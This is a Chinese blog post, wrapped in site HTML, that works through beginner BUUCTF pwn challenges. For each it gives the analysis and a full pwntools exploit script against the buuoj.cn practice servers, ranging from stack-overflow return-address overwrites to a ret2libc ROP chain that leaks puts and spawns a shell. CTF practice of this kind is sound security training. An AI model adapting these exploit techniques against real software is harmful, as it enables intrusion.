@@ -1,0 +1,432 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Cyurl3_BLOG</title>
+<meta name="description" content="我是一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。" />
+<link rel="shortcut icon" href="https://zhangzy999.github.io//favicon.ico?v=1592108388910">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://zhangzy999.github.io//styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://zhangzy999.github.io/">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://zhangzy999.github.io//images/avatar.png?v=1592108388910" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">Cyurl3_BLOG</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#test_your_nc">test_your_nc</a></li>
+<li><a href="#rip">rip</a></li>
+<li><a href="#pwn1_sctf_2016">pwn1_sctf_2016</a></li>
+<li><a href="#ciscn_2019_c_1">ciscn_2019_c_1</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="https://zhangzy999.github.io/" class="menu" style="animation-delay: 0s">
+          主页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          所有文章
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/post/dalaoboke" class="menu" style="animation-delay: 0.6000000000000001s">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">HELLO WORLD.</div>
+    <a class="rss" href="https://zhangzy999.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">buuctf：pwn刷题记录（一）</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-06-14 / 5 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://zhangzy999.github.io//post-images/buu_pwn_1.jpg" alt="">
+        
+        <div class="post-content yue">
+          <h2 id="test_your_nc">test_your_nc</h2>
+<p>连接一下拿flag</p>
+<h2 id="rip">rip</h2>
+<p>简单运行一下看看程序的效果<br>
+<img src="https://zhangzy999.github.io//post-images/1592105587965.png" alt="" loading="lazy"><br>
+ida分析一下是栈溢出，我们确定偏移量<br>
+<img src="https://zhangzy999.github.io//post-images/1592105611254.png" alt="" loading="lazy"><br>
+然后找到system地址<br>
+<img src="https://zhangzy999.github.io//post-images/1592105636965.png" alt="" loading="lazy"><br>
+写exp</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+
+ip = 'node3.buuoj.cn'
+port = '26614'
+r = remote(ip,port)
+
+offset = 0xF + 0x8
+system_addr = 0x40118A
+
+payload = offset * 'A' + p64(system_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>##warmup_csaw_2016<br>
+看看程序功能<br>
+<img src="https://zhangzy999.github.io//post-images/1592105945920.png" alt="" loading="lazy"><br>
+检查一下程序保护机制发现啥也没开，直接ida确定偏移量<br>
+<img src="https://zhangzy999.github.io//post-images/1592105959786.png" alt="" loading="lazy"><br>
+发现system地址<br>
+<img src="https://zhangzy999.github.io//post-images/1592105988264.png" alt="" loading="lazy"><br>
+写exp</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+
+#filename = ''
+#procedure = './' + filename
+#sh = process(procedure)
+#elf = ELF(procedure)
+
+ip = 'node3.buuoj.cn'
+port = '25606'
+r = remote(ip,port)
+
+offset = 0x40 + 0x8
+
+r.recvuntil(':')
+cat_flag_addr = r.recvuntil('\n',drop = True)
+cat_flag_addr = int(cat_flag_addr,16)
+
+payload = offset * 'A' + p64(cat_flag_addr)
+
+r.recvuntil('&gt;')
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<h2 id="pwn1_sctf_2016">pwn1_sctf_2016</h2>
+<p>运行程序<br>
+<img src="https://zhangzy999.github.io//post-images/1592106307688.png" alt="" loading="lazy"><br>
+然后我们ida分析一下，可以发现是c++写的（枯了）<br>
+然后有个很奇怪的点，可以发现我们输入的字符不足以造成栈溢出<br>
+<img src="https://zhangzy999.github.io//post-images/1592106337646.png" alt="" loading="lazy"><br>
+不过下文好像是有那么一个把&quot;I&quot;替换成&quot;you&quot;的功能<br>
+<img src="https://zhangzy999.github.io//post-images/1592106374757.png" alt="" loading="lazy"><br>
+我们运行一下程序<br>
+<img src="https://zhangzy999.github.io//post-images/1592106425805.png" alt="" loading="lazy"><br>
+这样的话能把一个字符变成三个字符就能够进行溢出了<br>
+我们找system地址<br>
+<img src="https://zhangzy999.github.io//post-images/1592106459207.png" alt="" loading="lazy"><br>
+编写exp</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+
+ip = 'node3.buuoj.cn'
+port = '29955'
+r = remote(ip,port)
+
+offset = 0xC + 0x4 
+get_flag_addr = 0x08048F0D
+
+payload = 20 * 'I' + p32(get_flag_addr) + p32(get_flag_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>##ciscn_2019_n_1<br>
+运行程序<br>
+<img src="https://zhangzy999.github.io//post-images/1592106960725.png" alt="" loading="lazy"><br>
+进ida看看<br>
+<img src="https://zhangzy999.github.io//post-images/1592106975484.png" alt="" loading="lazy"><br>
+应该是让我们溢出v2的值，让v2等于11.28125就能cat flag<br>
+那么问题就是11.28125在内存是如何表示的？<br>
+有一张图参考一下，不是本题重点，可自行查阅一下浮点数在内存中的表示方法<br>
+<img src="https://zhangzy999.github.io//post-images/1592107268975.png" alt="" loading="lazy"><br>
+最终计算一下就是0x41348000<br>
+编写exp</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+
+ip = 'node3.buuoj.cn'
+port = '26369'
+r = remote(ip,port)
+
+offset = 0x2C
+
+payload = offset * 'A' + p64(0x41348000)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<h2 id="ciscn_2019_c_1">ciscn_2019_c_1</h2>
+<p>这个题比上面四个加起来还难=.=<br>
+我们运行一下程序，发现有三个功能，第一个功能就是一个加密的功能，第二个功能没用，程序让我们自己解密。。。第三个功能程序直接退出了<br>
+<img src="https://zhangzy999.github.io//post-images/1592107658336.png" alt="" loading="lazy"><br>
+ida发现加密函数是这样的<br>
+<img src="https://zhangzy999.github.io//post-images/1592107650559.png" alt="" loading="lazy"><br>
+然后puts函数会输出加密后的信息<br>
+这个题没有后门之类的函数，需要我们构造ROP链，那么我们首先要拿到system函数或者execve这样的函数的地址，用LibcSearcher来搞<br>
+再次之前我们先要获取puts函数的地址，由于puts函数只有一个参数，也就是rdi寄存器里的，那么我们来找一下pop rdi;ret这样的片段，发现是有这种片段的<br>
+<img src="https://zhangzy999.github.io//post-images/1592107809362.png" alt="" loading="lazy"><br>
+然而这个片段实际上是__libc_csu_init函数（一个初始化libc的函数）的片段，pop r15指令是三个16进制数，然而后两个十六进制数组合正好是pop rdi，也就是能用ROPgadget搜到的那个片段，由于我们只有一个参数，直接用那个片段来玩就行，不再展开用__libc_csu_init函数来构造ROP链了（wiki上有详细说明）<br>
+<img src="https://zhangzy999.github.io//post-images/1592108028058.png" alt="" loading="lazy"><br>
+注意我们的payload会被加密，两次异或加密后还是其本身，所以我们自己来写个解密函数好了，由于两次payload的长度一样，所以第二次发payload就不会再被加密了（用ida分析可知）<br>
+直接贴个exp吧，注意，第二次的payload有一个栈对齐，所以我们加上一个ret指令来进行对齐即可</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# Author:CyurL3
+
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+ip = 'node3.buuoj.cn'
+port = '27912'
+r = remote(ip,port)
+#sh = process('./ciscn_2019_c_1')
+elf = ELF('./ciscn_2019_c_1')
+
+offset = 0x58
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+gets_got = elf.got['gets']
+main_addr = elf.symbols['main']
+fregment_one = 0x400c7a
+fregment_two = 0x400c60
+pop_rdi_ret = 0x400c83
+bss_base = elf.bss()
+
+def encrypt(payload):
+    l = list(payload)
+    for i in range(len(l)):
+        if l[i].isdigit():
+            l[i] = chr(ord(l[i]) ^ 0xF)
+        elif l[i].isupper():
+            l[i] = chr(ord(l[i]) ^ 0xE)
+        elif l[i].islower():
+            l[i] = chr(ord(l[i]) ^ 0xD)
+    return ''.join(l)
+
+r.recvuntil('Input your choice!\n')
+r.sendline('1')
+r.recvuntil('Input your Plaintext to be encrypted\n')
+
+payload = offset * 'A' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +p64(main_addr)
+payload = encrypt(payload)
+r.sendline(payload)
+
+r.recvuntil('Ciphertext\n')
+r.recvuntil('\n')
+puts_addr = u64(r.recvuntil('\n', drop=True).ljust(8,'\x00'))
+print 'puts_addr:' + hex(puts_addr)
+
+libc = LibcSearcher('puts',puts_addr)
+libcbase = puts_addr - libc.dump('puts')
+system_addr = libcbase + libc.dump('system')
+bin_sh_addr = libcbase + libc.dump('str_bin_sh')
+print 'system:' + hex(system_addr)
+
+r.recvuntil('Input your choice!\n')
+r.sendline('1')
+r.recvuntil('Input your Plaintext to be encrypted\n')
+
+ret_addr = 0x4006b9
+payload = offset * 'A' + p64(ret_addr)  + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) 
+#payload = encrypt(payload)
+r.sendline(payload)
+r.interactive()
+</code></pre>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/GIVoDN4FV/">
+            <span class="flex-auto">ROP</span>
+          </a>
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/wxEMEW0CR/">
+            <span class="flex-auto">栈溢出</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/format_string_study/">
+                <h3 class="post-title">
+                  格式化字符串漏洞学习总结
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://zhangzy999.github.io//media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
